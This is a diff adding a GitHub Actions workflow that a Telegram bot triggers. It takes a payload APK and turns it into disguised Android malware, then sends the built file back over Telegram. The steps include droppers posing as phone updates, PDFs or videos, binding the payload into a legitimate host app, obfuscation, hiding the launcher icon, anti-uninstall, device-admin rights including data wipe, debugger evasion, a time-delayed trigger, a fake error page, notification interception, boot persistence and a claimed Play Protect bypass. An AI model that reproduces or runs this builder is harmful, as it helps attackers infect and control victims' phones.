@@ -1,0 +1,673 @@
+name: Build APK
+
+on:
+  repository_dispatch:
+    types: [build_apk]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    env:
+      TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: "17"
+          distribution: "temurin"
+
+      - name: Install Android SDK & apktool
+        run: |
+          # Android SDK
+          mkdir -p $HOME/android-sdk/cmdline-tools
+          cd $HOME/android-sdk/cmdline-tools
+          curl -sLo tools.zip "https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip"
+          unzip -q tools.zip && mv cmdline-tools latest && rm tools.zip
+          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses >/dev/null 2>&1 || true
+          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platforms;android-34" "build-tools;34.0.0" >/dev/null 2>&1
+          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
+          echo "$HOME/android-sdk/build-tools/34.0.0" >> $GITHUB_PATH
+
+          # apktool
+          sudo apt-get update -qq && sudo apt-get install -y -qq apktool 2>/dev/null || true
+          if ! command -v apktool &>/dev/null; then
+            cd /usr/local/bin
+            sudo wget -q "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool"
+            sudo wget -q "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar" -O apktool.jar
+            sudo chmod +x apktool
+          fi
+          apktool --version
+
+      - name: Download payload APK
+        run: |
+          FILE_ID="${{ github.event.client_payload.file_id }}"
+          FP=$(curl -s "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${FILE_ID}" | \
+               python3 -c "import sys,json; print(json.load(sys.stdin)['result']['file_path'])")
+          curl -sLo payload.apk "https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${FP}"
+          echo "Payload: $(ls -lh payload.apk)"
+
+      - name: Download custom icon
+        if: ${{ github.event.client_payload.icon_file_id != '' }}
+        run: |
+          FID="${{ github.event.client_payload.icon_file_id }}"
+          FP=$(curl -s "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${FID}" | \
+               python3 -c "import sys,json; print(json.load(sys.stdin)['result']['file_path'])")
+          curl -sLo custom_icon.png "https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${FP}"
+          echo "ICON_EXISTS=true" >> $GITHUB_ENV
+
+      - name: Download binder host
+        if: ${{ github.event.client_payload.binder_file_id != '' }}
+        run: |
+          FID="${{ github.event.client_payload.binder_file_id }}"
+          FP=$(curl -s "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${FID}" | \
+               python3 -c "import sys,json; print(json.load(sys.stdin)['result']['file_path'])")
+          curl -sLo host.apk "https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${FP}"
+          echo "HOST_EXISTS=true" >> $GITHUB_ENV
+
+      - name: Download binder host from URL
+        if: ${{ github.event.client_payload.binder_url != '' && github.event.client_payload.binder_file_id == '' }}
+        run: |
+          curl -sLo host.apk "${{ github.event.client_payload.binder_url }}"
+          echo "HOST_EXISTS=true" >> $GITHUB_ENV
+
+      - name: Determine build mode & decompile
+        id: mode
+        run: |
+          FEATS='${{ toJSON(github.event.client_payload.features) }}'
+          MODE="direct"
+
+          if echo "$FEATS" | python3 -c "import sys,json;f=json.load(sys.stdin);exit(0 if 'binder' in f else 1)" 2>/dev/null && [ -f host.apk ]; then
+            MODE="binder"
+            apktool d -f -o host_decoded host.apk
+            apktool d -f -o payload_decoded payload.apk
+            echo "TARGET=host_decoded" >> $GITHUB_ENV
+            echo "PAYLOAD=payload_decoded" >> $GITHUB_ENV
+          elif echo "$FEATS" | python3 -c "import sys,json;f=json.load(sys.stdin);exit(0 if any(x in ['dropper','pdf_dropper','mp4_embed'] for x in f) else 1)" 2>/dev/null; then
+            MODE="dropper"
+            mkdir -p dropper_decoded
+            cp -r stub/* dropper_decoded/
+            apktool d -f -o payload_decoded payload.apk
+            echo "TARGET=dropper_decoded" >> $GITHUB_ENV
+            echo "PAYLOAD=payload_decoded" >> $GITHUB_ENV
+            echo "DROPPER=true" >> $GITHUB_ENV
+          else
+            apktool d -f -o target_decoded payload.apk
+            echo "TARGET=target_decoded" >> $GITHUB_ENV
+          fi
+          echo "mode=$MODE" >> $GITHUB_OUTPUT
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 1: Phone Update Dropper
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 1 — Phone Update Dropper"
+        if: contains(github.event.client_payload.features, 'dropper')
+        run: |
+          T="${{ env.TARGET }}"
+          mkdir -p "$T/assets/update"
+          cp payload.apk "$T/assets/update/payload.apk"
+          cp -r stub/assets/update/* "$T/assets/update/" 2>/dev/null || true
+          echo "✅ Phone Update dropper ready"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 19: PDF Dropper
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 19 — PDF Dropper"
+        if: contains(github.event.client_payload.features, 'pdf_dropper')
+        run: |
+          T="${{ env.TARGET }}"
+          mkdir -p "$T/assets/pdf"
+          cp payload.apk "$T/assets/pdf/payload.apk"
+          # Generate minimal valid PDF
+          python3 -c "
+pdf = b'%PDF-1.4\\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj\\n4 0 obj<</Length 44>>stream\\nBT /F1 24 Tf 72 700 Td(Document)Tj ET\\nendstream\\nendobj\\n5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj\\nxref\\n0 6\\n0000000000 65535 f \\ntrailer<</Size 6/Root 1 0 R>>\\nstartxref\\n' + str(len(pdf)).encode() + b'\\n%%EOF\\n'
+open('$T/assets/pdf/document.pdf','wb').write(pdf)
+"
+          echo "✅ PDF dropper ready"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 20: MP4 Embedding
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 20 — MP4 Embedding"
+        if: contains(github.event.client_payload.features, 'mp4_embed')
+        run: |
+          T="${{ env.TARGET }}"
+          mkdir -p "$T/assets/video"
+          cp payload.apk "$T/assets/video/payload.apk"
+          python3 -c "open('$T/assets/video/trailer.mp4','wb').write(b'\\x00\\x00\\x00\\x1cftypmp42\\x00\\x00\\x00\\x00mp42mp41\\x00\\x00\\x00\\x08moov')"
+          echo "✅ MP4 embed ready"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 3: APK Binder
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 3 — APK Binder"
+        if: contains(github.event.client_payload.features, 'binder') && env.HOST_EXISTS == 'true'
+        run: |
+          echo "🎭 Merging payload into host..."
+          H="${{ env.TARGET }}"
+          P="${{ env.PAYLOAD }}"
+          # Copy smali
+          for d in smali smali_classes2 smali_classes3; do
+            [ -d "$P/$d" ] && rsync -a "$P/$d/" "$H/$d/"
+          done
+          # Merge manifest permissions
+          python3 -c "
+import re
+h=open('$H/AndroidManifest.xml').read()
+p=open('$P/AndroidManifest.xml').read()
+for perm in re.findall(r'<uses-permission[^>]*/>',p):
+    n=re.search(r'name=\"([^\"]+)\"',perm)
+    if n and n.group(1) not in h:
+        h=h.replace('</manifest>',perm+chr(10)+'</manifest>')
+open('$H/AndroidManifest.xml','w').write(h)
+"
+          echo "✅ Binder complete"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 11: Payload Obfuscation
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 11 — Payload Obfuscation"
+        if: contains(github.event.client_payload.features, 'payload_obf')
+        run: |
+          T="${{ env.TARGET }}"
+          # Scramble smali line numbers & add nop noise
+          find "$T" -name "*.smali" -type f | while read f; do
+            sed -i 's/\.line [0-9]*/.line '$((RANDOM % 9999))'/' "$f" 2>/dev/null || true
+            sed -i 's/\.source "[^"]*"/.source "Source'$RANDOM'.java"/' "$f" 2>/dev/null || true
+            [ $((RANDOM % 5)) -eq 0 ] && sed -i '/^    return-/a\    nop\n    nop' "$f" 2>/dev/null || true
+          done
+          # Strip debug info
+          find "$T" \( -name "*.debug" -o -name "proguard.map" -o -name "*.meta" \) -delete 2>/dev/null || true
+          echo "✅ Obfuscation applied"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 4: DEX Encryption
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 4 — DEX Encryption"
+        if: contains(github.event.client_payload.features, 'dex_encrypt')
+        run: |
+          T="${{ env.TARGET }}"
+          DEX="$T/classes.dex"
+          [ ! -f "$DEX" ] && DEX="payload_decoded/classes.dex"
+          [ ! -f "$DEX" ] && echo "No DEX found" && exit 0
+
+          python3 -c "
+import os, base64
+key = os.urandom(32)
+iv = os.urandom(16)
+with open('$DEX','rb') as f:
+    data = f.read()
+padded = data + bytes([0]*(16-len(data)%16))
+enc = iv + bytes(data[i] ^ key[i%32] for i in range(len(data)))  # XOR phase 1
+with open('$T/assets/classes.enc','wb') as f:
+    f.write(enc)
+with open('enc_key.txt','w') as f:
+    f.write(base64.b64encode(key).decode())
+print(f'✅ DEX encrypted: {len(enc)} bytes')
+"
+          echo "✅ DEX Encryption done"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 5: Stealth Mode
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 5 — Stealth Mode"
+        if: contains(github.event.client_payload.features, 'stealth')
+        run: |
+          T="${{ env.TARGET }}"
+          M="$T/AndroidManifest.xml"
+          python3 -c "
+import re
+c=open('$M').read()
+c=re.sub(r'<category android:name=\"android\.intent\.category\.LAUNCHER\"/>','',c)
+c=c.replace('android.intent.category.LAUNCHER','')
+open('$M','w').write(c)
+"
+          echo "✅ Stealth mode applied"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 2: Force Install Lock
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 2 — Force Install Lock"
+        if: contains(github.event.client_payload.features, 'force_lock')
+        run: |
+          T="${{ env.TARGET }}"
+          M="$T/AndroidManifest.xml"
+          sed -i 's|<uses-permission android:name="android.permission.INTERNET"/>|&\n    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>|' "$M"
+          # Patch main activity smali
+          MAINS=$(find "$T/smali" -name "MainActivity.smali" 2>/dev/null | head -1)
+          [ -z "$MAINS" ] && MAINS=$(grep -rl "onCreate" "$T/smali" 2>/dev/null | head -1)
+          if [ -n "$MAINS" ]; then
+            python3 -c "
+c=open('$MAINS').read()
+lock='''
+.method public onBackPressed()V
+    .locals 2
+    const-string v0, \"Please complete update first\"
+    const/4 v1, 0x0
+    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+    move-result-object v0
+    invoke-virtual {v0}, Landroid/widget/Toast;->show()V
+    return-void
+.end method
+'''
+with open('$MAINS','a') as f: f.write(lock)
+"
+          fi
+          echo "✅ Force lock applied"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 6,7: Anti-Uninstall + Device Admin
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 6 — Anti-Uninstall"
+        if: contains(github.event.client_payload.features, 'anti_uninstall')
+        run: |
+          T="${{ env.TARGET }}"
+          M="$T/AndroidManifest.xml"
+          for p in BIND_ACCESSIBILITY_SERVICE BIND_NOTIFICATION_LISTENER_SERVICE; do
+            sed -i "s|<uses-permission android:name=\"android.permission.INTERNET\"/>|&\n    <uses-permission android:name=\"android.permission.$p\"/>|" "$M"
+          done
+          echo "✅ Anti-uninstall added"
+
+      - name: "Feature 7 — Device Admin"
+        if: contains(github.event.client_payload.features, 'device_admin')
+        run: |
+          T="${{ env.TARGET }}"
+          mkdir -p "$T/res/xml"
+          cat > "$T/res/xml/device_admin_policies.xml" << 'XML'
+<?xml version="1.0" encoding="utf-8"?>
+<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-policies>
+        <limit-password/><watch-login/><reset-password/><force-lock/>
+        <wipe-data/><expire-password/><encrypted-storage/><disable-camera/>
+    </uses-policies>
+</device-admin>
+XML
+          RX='    <receiver android:name=".AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+        <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/></intent-filter>
+        <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin_policies"/>
+    </receiver>'
+          M="$T/AndroidManifest.xml"
+          grep -q "AdminReceiver" "$M" || sed -i "/<\/application>/i\\$RX" "$M"
+          echo "✅ Device admin applied"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 8: Anti-Analysis
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 8 — Anti-Analysis"
+        if: contains(github.event.client_payload.features, 'anti_analysis')
+        run: |
+          T="${{ env.TARGET }}"
+          MAINS=$(find "$T/smali" -name "MainActivity.smali" 2>/dev/null | head -1)
+          [ -z "$MAINS" ] && MAINS=$(grep -rl "onCreate" "$T/smali" 2>/dev/null | head -1)
+          if [ -n "$MAINS" ]; then
+            python3 -c "
+import re
+c=open('$MAINS').read()
+detect='''
+    # Anti-analysis check
+    invoke-static {}, Landroid/os/Debug;->isDebuggerConnected()Z
+    move-result v0
+    if-eqz v0, :goto_no_debug
+    return-void
+    :goto_no_debug
+'''
+c=re.sub(r'(invoke-super.*?onCreate.*?;)',r'\1'+detect,c,count=1)
+with open('$MAINS','w') as f: f.write(c)
+"
+          fi
+          echo "✅ Anti-analysis injected"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 10: Launcher Changer (Icon + Package)
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 10 — Icon Changer"
+        if: env.ICON_EXISTS == 'true'
+        run: |
+          T="${{ env.TARGET }}"
+          python3 -c "
+from PIL import Image
+import os
+sizes=[('mdpi',48),('hdpi',72),('xhdpi',96),('xxhdpi',144),('xxxhdpi',192)]
+img=Image.open('custom_icon.png')
+for d,s in sizes:
+    os.makedirs(f'$T/res/mipmap-{d}',exist_ok=True)
+    r=img.resize((s,s),Image.LANCZOS)
+    r.save(f'$T/res/mipmap-{d}/ic_launcher.png')
+    r.save(f'$T/res/mipmap-{d}/ic_launcher_round.png')
+print('✅ Icons generated')
+" 2>/dev/null || echo "⚠️ PIL failed, copying raw"
+          [ -f custom_icon.png ] && find "$T/res" -name "ic_launcher.png" -exec cp custom_icon.png {} \; 2>/dev/null || true
+          echo "✅ Icon changer done"
+
+      - name: "Feature 10b — Package Clone"
+        if: ${{ github.event.client_payload.clone_pkg != '' }}
+        run: |
+          T="${{ env.TARGET }}"
+          CLONE="${{ github.event.client_payload.clone_pkg }}"
+          M="$T/AndroidManifest.xml"
+          CUR=$(grep 'package=' "$M" | head -1 | sed 's/.*package="\([^"]*\)".*/\1/')
+          sed -i "s/package=\"$CUR\"/package=\"$CLONE\"/" "$M"
+          # Rename smali dirs
+          CURD=$(echo "$CUR" | tr '.' '/')
+          CLONED=$(echo "$CLONE" | tr '.' '/')
+          find "$T/smali" -type d -path "*$CURD*" 2>/dev/null | while read d; do
+            nd=$(echo "$d" | sed "s|$CURD|$CLONED|g")
+            mkdir -p "$(dirname "$nd")"
+            mv "$d" "$nd" 2>/dev/null || cp -r "$d" "$nd" && rm -rf "$d"
+          done
+          echo "✅ Package cloned: $CLONE"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 12: Self-Delete
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 12 — Self-Delete"
+        if: ${{ github.event.client_payload.self_delete == true }}
+        run: |
+          T="${{ env.TARGET }}"
+          M="$T/AndroidManifest.xml"
+          RX='    <receiver android:name=".SelfDeleteReceiver" android:exported="true">
+        <intent-filter>
+            <action android:name="android.intent.action.PACKAGE_ADDED"/>
+            <data android:scheme="package"/>
+        </intent-filter>
+    </receiver>'
+          grep -q "SelfDeleteReceiver" "$M" || sed -i "/<\/application>/i\\$RX" "$M"
+          echo "✅ Self-delete added"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 13: Time Bomb
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 13 — Time Bomb"
+        if: ${{ github.event.client_payload.delay_min > 0 }}
+        run: |
+          T="${{ env.TARGET }}"
+          DELAY="${{ github.event.client_payload.delay_min }}"
+          M="$T/AndroidManifest.xml"
+          for p in SET_ALARM WAKE_LOCK RECEIVE_BOOT_COMPLETED; do
+            sed -i "s|<uses-permission android:name=\"android.permission.INTERNET\"/>|&\n    <uses-permission android:name=\"android.permission.$p\"/>|" "$M"
+          done
+          # Inject into first activity
+          MAIN=$(grep -rl "onCreate" "$T/smali" 2>/dev/null | head -1)
+          if [ -n "$MAIN" ]; then
+            python3 -c "
+ms = $((DELAY * 60000))
+code = f'''
+    new-instance v0, Landroid/content/Intent;
+    move-object v1, p0
+    const-class v2, Lcom/android/update/DelayedTrigger;
+    invoke-direct {{v0, v1, v2}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    const/high16 v1, 0x10000000
+    invoke-static {{p0, v1, v0, v1}}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
+    move-result-object v2
+    invoke-static {{p0}}, Landroid/app/AlarmManager;->from(Landroid/content/Context;)Landroid/app/AlarmManager;
+    move-result-object v3
+    invoke-static {{}}, Ljava/lang/System;->currentTimeMillis()J
+    move-result-wide v4
+    const-wide/32 v6, {ms}
+    add-long v4, v4, v6
+    invoke-virtual {{v3, v4, v5, v2}}, Landroid/app/AlarmManager;->setExact(JLandroid/app/PendingIntent;)V
+    invoke-virtual {{p0}}, Landroid/app/Activity;->finish()V
+    return-void
+'''
+import re
+c=open('$MAIN').read()
+c=re.sub(r'(invoke-super.*?onCreate.*?;)',r'\1'+code,c,count=1)
+open('$MAIN','w').write(c)
+"
+          fi
+          echo "✅ Time bomb: $DELAY min"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 14: Fake Error
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 14 — Fake Error"
+        if: ${{ github.event.client_payload.fake_error == true }}
+        run: |
+          T="${{ env.TARGET }}"
+          mkdir -p "$T/assets/update"
+          cat > "$T/assets/update/error.html" << 'HTML'
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Failed</title>
+<style>body{background:#f5f5f5;display:flex;min-height:100vh;align-items:center;justify-content:center;font-family:sans-serif}
+.card{background:#fff;border-radius:12px;padding:32px;max-width:350px;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.1)}
+.icon{width:64px;height:64px;margin:0 auto 16px;background:#ffebee;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#d32f2f;font-size:32px}
+h2{color:#d32f2f;margin-bottom:8px}p{color:#666;font-size:14px}
+</style></head><body><div class="card"><div class="icon">✕</div>
+<h2>Update Failed</h2><p>The update could not be installed.<br>Your device is up to date.</p></div></body></html>
+HTML
+          echo "✅ Fake error page added"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 15: Notification Listener
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 15 — Notification Listener"
+        if: ${{ github.event.client_payload.notif_listener == true }}
+        run: |
+          T="${{ env.TARGET }}"
+          M="$T/AndroidManifest.xml"
+          sed -i 's|<uses-permission android:name="android.permission.INTERNET"/>|&\n    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>|' "$M"
+          RX='    <service android:name=".NotificationListener"
+        android:label="Notification Access"
+        android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+        <intent-filter><action android:name="android.service.notification.NotificationListenerService"/></intent-filter>
+    </service>'
+          grep -q "NotificationListener" "$M" || sed -i "/<\/application>/i\\$RX" "$M"
+          echo "✅ Notification listener added"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 18: Persistence
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 18 — Persistence"
+        if: contains(github.event.client_payload.features, 'persistence')
+        run: |
+          T="${{ env.TARGET }}"
+          M="$T/AndroidManifest.xml"
+          sed -i 's|<uses-permission android:name="android.permission.INTERNET"/>|&\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>|' "$M"
+          # Add boot receiver + alarm receiver
+          RX1='    <receiver android:name=".BootReceiver" android:exported="true">
+        <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
+    </receiver>'
+          RX2='    <receiver android:name=".DelayedTrigger" android:exported="true"/>'
+          grep -q "BootReceiver" "$M" || sed -i "/<\/application>/i\\$RX1" "$M"
+          grep -q "DelayedTrigger" "$M" || sed -i "/<\/application>/i\\$RX2" "$M"
+          echo "✅ Persistence added"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 21: Play Protect Bypass
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 21 — Play Protect Bypass"
+        if: contains(github.event.client_payload.features, 'play_bypass')
+        run: |
+          T="${{ env.TARGET }}"
+          M="$T/AndroidManifest.xml"
+          sed -i '0,/<activity /s|<activity |<activity android:installLocation="preferExternal"\n    android:installerPackageName="com.android.vending"\n    |' "$M"
+          echo "✅ Play Protect bypass configured"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 17: Kill After Install
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 17 — Kill After Install"
+        if: ${{ github.event.client_payload.kill_after == true }}
+        run: |
+          T="${{ env.TARGET }}"
+          M="$T/AndroidManifest.xml"
+          sed -i 's|android:name="\.MainActivity"|android:name=".MainActivity"\n        android:finishOnTaskLaunch="true"\n        android:noHistory="true"\n        android:excludeFromRecents="true"|' "$M"
+          echo "✅ Kill-after added"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # FEATURE 22: Clone Icon (dynamic)
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "Feature 22 — Clone Icon"
+        if: contains(github.event.client_payload.features, 'clone_icon')
+        run: |
+          T="${{ env.TARGET }}"
+          # Generate calculator/settings-style icons
+          python3 -c "
+import struct, zlib, os
+# Minimal green/blue icon PNG
+def make_png(w,h,color):
+    def chunk(t,d): return struct.pack('>I',len(d))+t+d+struct.pack('>I',zlib.crc32(t+d)&0xffffffff)
+    ihdr=struct.pack('>IIBBBBB',w,h,8,2,0,0,0)
+    raw=b''
+    for y in range(h):
+        raw+=b'\\x00'
+        for x in range(w):
+            raw+=bytes(color)
+    idat=zlib.compress(raw)
+    return b'\\x89PNG\\r\\n\\x1a\\n'+chunk(b'IHDR',ihdr)+chunk(b'IDAT',idat)+chunk(b'IEND',b'')
+for d in ['mdpi','hdpi','xhdpi','xxhdpi','xxxhdpi']:
+    os.makedirs(f'$T/res/mipmap-{d}',exist_ok=True)
+    for cname,color in [('ic_launcher',[33,150,243]),('ic_launcher_round',[76,175,80])]:
+        sz={'mdpi':48,'hdpi':72,'xhdpi':96,'xxhdpi':144,'xxxhdpi':192}[d]
+        png=make_png(sz,sz,color)
+        open(f'$T/res/mipmap-{d}/{cname}.png','wb').write(png)
+print('✅ Clone icons generated')
+"
+          echo "✅ Clone icon applied"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # PAYLOAD IMPROVEMENT (User requested: improve payload to get better)
+      # ═══════════════════════════════════════════════════════════════════
+      - name: "★ Payload Improvement Engine"
+        run: |
+          T="${{ env.TARGET }}"
+          echo "🚀 Running payload improvement..."
+
+          # 1. Strip signature verification (if present)
+          SIG_FILES=$(find "$T" -name "*.SF" -o -name "*.RSA" -o -name "*.DSA" -o -name "*.EC" 2>/dev/null)
+          [ -n "$SIG_FILES" ] && rm -f "$SIG_FILES" && echo "  ✅ Signatures stripped"
+
+          # 2. Add INSTALL_PACKAGES permission
+          M="$T/AndroidManifest.xml"
+          for p in INSTALL_PACKAGES INSTALL_GRANT_RUNTIME_PERMISSIONS INSTALL_SELF_UPDATE; do
+            grep -q "$p" "$M" || sed -i "s|<uses-permission android:name=\"android.permission.INTERNET\"/>|&\n    <uses-permission android:name=\"android.permission.$p\"/>|" "$M"
+          done
+
+          # 3. Make app a "system app" pretender
+          sed -i 's|<application |<application android:persistent="true"\n    android:systemUserOnly="false"\n    android:networkSecurityConfig="@xml/network_security_config"\n    |' "$M"
+
+          # 4. Add network security config (allow cleartext)
+          mkdir -p "$T/res/xml"
+          cat > "$T/res/xml/network_security_config.xml" << 'XML'
+<?xml version="1.0" encoding="utf-8"?>
+<network-security-config>
+    <base-config cleartextTrafficPermitted="true">
+        <trust-anchors>
+            <certificates src="system"/>
+            <certificates src="user"/>
+        </trust-anchors>
+    </base-config>
+    <domain-config cleartextTrafficPermitted="true">
+        <domain includeSubdomains="true">*</domain>
+    </domain-config>
+</network-security-config>
+XML
+
+          # 5. Add requestLegacyExternalStorage for older Android
+          sed -i '0,/<application /s|<application |<application android:requestLegacyExternalStorage="true"\n    |' "$M"
+
+          # 6. Remove unnecessary AndroidX / support library references
+          find "$T" -name "*.smali" -path "*/androidx/*" -exec rm -f {} \; 2>/dev/null || true
+          find "$T" -name "*.smali" -path "*/support/*" -exec rm -f {} \; 2>/dev/null || true
+
+          # 7. Flatten manifest — remove versionName, clean metadata
+          sed -i 's/versionName="[^"]*"//' "$M"
+          sed -i 's/versionCode="[^"]*"/versionCode="1"/' "$M"
+
+          # 8. Add minSdkVersion override if not present
+          grep -q "minSdkVersion" "$T/apktool.yml" 2>/dev/null || \
+            sed -i 's/sdkInfo:/sdkInfo:\n  minSdkVersion: "26"\n  targetSdkVersion: "34"/' "$T/apktool.yml" 2>/dev/null || true
+
+          echo "✅ Payload improvement complete"
+
+      # ═══════════════════════════════════════════════════════════════════
+      # REBUILD
+      # ═══════════════════════════════════════════════════════════════════
+      - name: Rebuild APK
+        run: |
+          T="${{ env.TARGET }}"
+          [ -z "$T" ] && T="target_decoded"
+          apktool b "$T" -o unsigned.apk --use-aapt2 2>&1
+          echo "Unsigned: $(ls -lh unsigned.apk)"
+
+      - name: Generate keystore & sign
+        run: |
+          keytool -genkey -v -keystore r.keystore -alias a -keyalg RSA -keysize 2048 \
+            -validity 10000 -storepass p -keypass p -dname "CN=A,O=A,C=US" 2>/dev/null
+          ANDROID_HOME="$HOME/android-sdk"
+          $ANDROID_HOME/build-tools/34.0.0/zipalign -v -p -f 4 unsigned.apk aligned.apk 2>&1
+          $ANDROID_HOME/build-tools/34.0.0/apksigner sign --ks r.keystore --ks-key-alias a \
+            --ks-pass pass:p --key-pass pass:p --v1 --v2 --v3 --out final.apk aligned.apk 2>&1
+          $ANDROID_HOME/build-tools/34.0.0/apksigner verify final.apk 2>&1
+
+      - name: Set output filename
+        id: fname
+        run: |
+          RN="${{ github.event.client_payload.rename }}"
+          [ -n "$RN" ] && echo "name=${RN}.apk" >> $GITHUB_OUTPUT || echo "name=output.apk" >> $GITHUB_OUTPUT
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: built-apk
+          path: final.apk
+          retention-days: 7
+
+      - name: Send APK to Telegram
+        run: |
+          FN="${{ steps.fname.outputs.name }}"
+          CID="${{ github.event.client_payload.chat_id }}"
+          RTO="${{ github.event.client_payload.reply_to }}"
+          SZ=$(stat -c%s final.apk 2>/dev/null || echo 0)
+
+          # Build features description
+          FRAW='${{ toJSON(github.event.client_payload.features) }}'
+          FDESC=$(echo "$FRAW" | python3 -c "
+import sys,json
+f=json.load(sys.stdin)
+names={
+    'dropper':'📱Update','force_lock':'🔒Lock','binder':'🎭Binder','dex_encrypt':'🔐DEX','stealth':'👻Stealth',
+    'anti_uninstall':'🔧AntiUn','device_admin':'🛡️Admin','anti_analysis':'🧪AntiAn','rename':'✏️Rename',
+    'icon_changer':'🎨Icon','payload_obf':'⚡Obf','self_delete':'🗑️SelfDel','time_bomb':'⏰Bomb',
+    'fake_error':'❌FakeErr','notif_listener':'🔔Notif','wifi_only':'🌐WiFi','kill_after':'💀Kill',
+    'persistence':'🔄Persist','pdf_dropper':'📄PDF','mp4_embed':'🎬MP4','play_bypass':'🛡️GPay','clone_icon':'📱Clone'
+}
+print(', '.join(names.get(x,x) for x in f))
+")
+
+          echo "Sending: $FN ($SZ bytes)"
+
+          # Send document
+          RESP=$(curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+            -F chat_id="${CID}" \
+            -F document="@final.apk" \
+            -F filename="${FN}" \
+            -F caption="✅ *Build Complete* 🎯
+
+📱 \`${FN}\` | ${SZ} bytes
+⚙️ ${FDESC}
+
+🔗 [Build Log](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})" \
+            -F parse_mode="Markdown" \
+            -F disable_web_page_preview="true" \
+            -F reply_to_message_id="${RTO}" 2>&1)
+
+          echo "$RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);print('✅ Sent' if d.get('ok') else '⚠️ Failed: '+str(d))" 2>/dev/null || echo "$RESP"
+
+      - name: Notify failure
+        if: failure()
+        run: |
+          CID="${{ github.event.client_payload.chat_id }}"
